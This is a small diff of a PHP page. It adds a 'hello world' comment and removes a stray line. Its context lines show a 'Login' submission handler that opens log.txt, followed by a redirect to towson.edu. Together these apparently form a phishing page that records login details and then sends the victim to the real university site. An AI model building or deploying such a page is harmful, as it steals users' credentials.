@@ -7,6 +7,7 @@
 <?php
 
 //If Submit Button Is Clicked Do the Following
+// hello world
 if ($_POST['Login']){
 
 $myFile = "log.txt";
@@ -20,7 +21,7 @@ fclose($fh);
 } ?>
 
 
-//goes here after
+
 <script>location.href='https://towson.edu';</script>
 	 
  </body>
